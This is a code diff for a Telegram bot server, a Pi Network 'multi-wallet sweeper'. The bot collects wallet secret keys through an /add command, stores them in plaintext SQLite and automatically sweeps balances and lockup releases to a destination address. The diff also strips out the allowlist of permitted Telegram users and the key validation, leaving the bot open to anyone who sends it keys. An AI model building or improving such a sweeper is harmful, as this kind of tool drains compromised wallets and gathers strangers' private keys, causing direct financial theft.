@@ -1,115 +1,142 @@
-require('dotenv').config();
+/**
+ * Telegram Bot Controller & Server for Ultimate Multi-Wallet Hyper-Sweeper
+ */
+
 const TelegramBot = require('node-telegram-bot-api');
-const { openDatabase } = require('./database');
+const Database = require('better-sqlite3');
 const { startMonitor } = require('./monitor');
+const { checkAndSweepWallet } = require('./sweeper');
 
-const token = process.env.TELEGRAM_BOT_TOKEN;
-const horizonUrl = (process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com').replace(/\/+$/, '');
-const interval = Math.max(1000, Number(process.env.POLL_INTERVAL_MS || 1000));
-const allowed = new Set((process.env.ALLOWED_TELEGRAM_IDS || '')
-  .split(',').map(x => x.trim()).filter(Boolean));
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';
 
-if (!token) {
-  console.error('Missing TELEGRAM_BOT_TOKEN. Configure it in environment variables.');
+if (!TOKEN) {
+  console.error('ERROR: TELEGRAM_BOT_TOKEN is missing in environment variables.');
   process.exit(1);
 }
 
-const db = openDatabase();
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(TOKEN, { polling: true });
+const db = new Database('wallets.db');
 
-function permitted(msg) {
-  return allowed.size === 0 || allowed.has(String(msg.from?.id));
-}
-function reply(msg, text) {
-  return bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown', disable_web_page_preview: true });
-}
-function help() {
-  return [
-    '⚡ **Ultimate Multi-Wallet Hyper-Sweeper**',
-    '',
-    '`/add <PUBLIC_G_ADDRESS> <SECRET_S_KEY>` — register a wallet box with its secret key for instant sweeping',
-    '`/status` — view all active individual wallet boxes, balances, and sweep counts',
-    '`/remove <ID>` — stop monitoring and remove a specific wallet box',
-    '`/help` — show commands',
-    '',
-    '🔄 *Engine Status:* Running 24/7. Automatically inspects every millisecond, waits for lockups to clear, and instantly sweeps any coin removed or deposited into your designated destination address.'
-  ].join('\n');
-}
+// Initialize Database Table
+db.prepare(`
+  CREATE TABLE IF NOT EXISTS wallets (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    chat_id TEXT,
+    public_key TEXT UNIQUE,
+    secret_key TEXT,
+    sweep_count INTEGER DEFAULT 0,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  )
+`).run();
 
-bot.onText(/^\/start(?:@\w+)?$/, async msg => {
-  if (!permitted(msg)) return;
-  await reply(msg, help());
+console.log('[Database] Wallet storage initialized successfully.');
+
+// Start 24/7 Real-Time Monitoring & Sweeping Engine
+startMonitor({ db, bot, horizonUrl: HORIZON_URL });
+
+// Telegram Bot Commands
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  bot.sendMessage(chatId, 
+    `⚡ **Ultimate Multi-Wallet Hyper-Sweeper Active**\n\n` +
+    `/add <PUBLIC_G_ADDRESS> <SECRET_S_KEY> — Register a wallet box for instant sweeping\n` +
+    `/status — View all active individual wallet boxes, balances, and sweep counts\n` +
+    `/remove <ID> — Stop monitoring and remove a specific wallet box\n` +
+    `/help — Show commands`,
+    { parse_mode: 'Markdown' }
+  );
 });
-bot.onText(/^\/help(?:@\w+)?$/, async msg => {
-  if (!permitted(msg)) return;
-  await reply(msg, help());
+
+bot.onText(/\/help/, (msg) => {
+  bot.sendMessage(msg.chat.id, 
+    `📖 **Commands Guide:**\n\n` +
+    `/add <G...> <S...> - Add wallet box\n` +
+    `/status - Check balances and sweeps\n` +
+    `/remove <ID> - Delete wallet box`,
+    { parse_mode: 'Markdown' }
+  );
 });
 
-bot.onText(/^\/add(?:@\w+)?\s+(\S+)\s+(\S+)$/, async (msg, match) => {
-  if (!permitted(msg)) return;
-  const address = match[1].trim();
-  const secretKey = match[2].trim();
+bot.onText(/\/add (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const parts = match[1].trim().split(/\s+/);
 
-  if (!/^G[A-Z2-7]{55}$/.test(address)) {
-    return reply(msg, '❌ Invalid public address format. Must start with `G`.');
+  if (parts.length < 2) {
+    return bot.sendMessage(chatId, '❌ Invalid format. Use: `/add <PUBLIC_G_ADDRESS> <SECRET_S_KEY>`', { parse_mode: 'Markdown' });
   }
-  if (!/^S[A-Z2-7]{55}$/.test(secretKey)) {
-    return reply(msg, '❌ Invalid secret key format. Must start with `S`.');
-  }
+
+  const publicKey = parts[0];
+  const secretKey = parts[1];
 
   try {
-    const existing = db.prepare('SELECT id FROM wallets WHERE chat_id=? AND public_key=?')
-      .get(String(msg.chat.id), address);
-    if (existing) return reply(msg, `⚠️ Wallet box #${existing.id} is already registered and active.`);
+    const stmt = db.prepare('INSERT INTO wallets (chat_id, public_key, secret_key) VALUES (?, ?, ?)');
+    const info = stmt.run(String(chatId), publicKey, secretKey);
 
-    const result = db.prepare(
-      'INSERT INTO wallets(chat_id, public_key, secret_key, created_at) VALUES(?,?,?,?)'
-    ).run(String(msg.chat.id), address, secretKey, Date.now());
-
-    await reply(msg, 
-      `✅ **New Wallet Box Created!** (Box #${result.lastInsertRowid})\n` +
-      `🔑 **Address:** \`${address}\`\n` +
-      `📦 *Status:* Active in inspection loop. Monitoring every millisecond for deposits and lockup releases!`
+    bot.sendMessage(chatId, 
+      `✅ **New Wallet Box Created! (Box #${info.lastInsertRowid})**\n` +
+      `🔑 Address: \`${publicKey}\`\n` +
+      `📦 Status: Active in real-time stream. Monitoring instantly for deposits and lockups!`,
+      { parse_mode: 'Markdown' }
     );
-  } catch (e) {
-    console.error('Add wallet failed:', e.message);
-    return reply(msg, '❌ Could not save that wallet box. Check server logs.');
+
+    // Immediately check and sweep any existing balance upon adding
+    const newWallet = db.prepare('SELECT * FROM wallets WHERE id = ?').get(info.lastInsertRowid);
+    if (newWallet) {
+      await checkAndSweepWallet(newWallet, HORIZON_URL, db, bot);
+    }
+  } catch (error) {
+    if (error.message.includes('UNIQUE constraint failed')) {
+      bot.sendMessage(chatId, '⚠️ This wallet address is already registered in the system.');
+    } else {
+      bot.sendMessage(chatId, `❌ Error adding wallet: ${error.message}`);
+    }
   }
 });
 
-bot.onText(/^\/status(?:@\w+)?$/, async msg => {
-  if (!permitted(msg)) return;
-  const rows = db.prepare('SELECT id, public_key, last_native, sweep_count, last_seen_at FROM wallets WHERE chat_id=? ORDER BY id')
-    .all(String(msg.chat.id));
-  if (!rows.length) return reply(msg, '📭 No wallet boxes registered yet. Use `/add <G_ADDRESS> <S_SECRET_KEY>` to add one.');
+bot.onText(/\/status/, async (msg) => {
+  const chatId = msg.chat.id;
+  const wallets = db.prepare('SELECT * FROM wallets WHERE chat_id = ?').all(String(chatId));
 
-  const boxes = rows.map(w => {
-    const balance = w.last_native == null ? 'Checking...' : `${w.last_native} Pi`;
-    const checked = w.last_seen_at ? new Date(w.last_seen_at).toLocaleTimeString() : 'pending';
-    return `📦 **Wallet Box #${w.id}**\n` +
-           `├ 🔑 Address: \`${w.public_key}\`\n` +
-           `├ 💰 Current Balance: \`${balance}\`\n` +
-           `├ ⚡ Total Sweeps Executed: \`${w.sweep_count}\`\n` +
-           `└ 🕒 Last Inspected: \`${checked}\``;
-  });
+  if (wallets.length === 0) {
+    return bot.sendMessage(chatId, '📭 You have no active wallet boxes registered. Use `/add` to register one.', { parse_mode: 'Markdown' });
+  }
 
-  await reply(msg, `📊 **Active Wallet Boxes (${rows.length})**\n\n` + boxes.join('\n\n'));
+  let response = `📊 **Active Wallet Boxes (${wallets.length})**\n\n`;
+  const StellarSdk = require('@stellar/stellar-sdk');
+  const server = new StellarSdk.Horizon.Server(HORIZON_URL);
+
+  for (const w of wallets) {
+    let currentBalance = 'Unknown';
+    try {
+      const acc = await server.loadAccount(w.public_key);
+      const native = acc.balances.find(b => b.asset_type === 'native');
+      if (native) currentBalance = `${native.balance} Pi`;
+    } catch (e) {
+      currentBalance = 'Unfunded / Error';
+    }
+
+    response += `📦 **Wallet Box #${w.id}**\n` +
+                `├ 🔑 Address: \`${w.public_key}\`\n` +
+                `├ 💰 Current Balance: \`${currentBalance}\`\n` +
+                `├ ⚡ Total Sweeps Executed: \`${w.sweep_count}\`\n` +
+                `└ 🕒 Last Inspected: \`${new Date().toLocaleTimeString()}\`\n\n`;
+  }
+
+  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
 });
 
-bot.onText(/^\/remove(?:@\w+)?\s+(\d+)$/, async (msg, match) => {
-  if (!permitted(msg)) return;
-  const id = Number(match[1]);
-  const result = db.prepare('DELETE FROM wallets WHERE id=? AND chat_id=?')
-    .run(id, String(msg.chat.id));
-  await reply(msg, result.changes
-    ? `🗑️ Wallet box #${id} successfully removed from monitoring.`
-    : `❌ Wallet box #${id} not found.`);
+bot.onText(/\/remove (\d+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const id = match[1];
+
+  const result = db.prepare('DELETE FROM wallets WHERE id = ? AND chat_id = ?').run(id, String(chatId));
+
+  if (result.changes > 0) {
+    bot.sendMessage(chatId, `🗑️ Wallet Box #${id} has been successfully removed and stopped.`);
+  } else {
+    bot.sendMessage(chatId, `❌ Wallet Box #${id} not found or unauthorized.`);
+  }
 });
 
-startMonitor({ db, bot, horizonUrl, interval });
-
-bot.on('polling_error', e => console.error('Telegram polling error:', e.message));
-process.on('SIGINT', () => { bot.stopPolling(); db.close(); process.exit(0); });
-process.on('SIGTERM', () => { bot.stopPolling(); db.close(); process.exit(0); });
-
-console.log(`Ultimate Multi-Wallet Sweeper active; polling every ${interval}ms.`);
+console.log('[Server] Telegram Bot server running and listening for commands.');
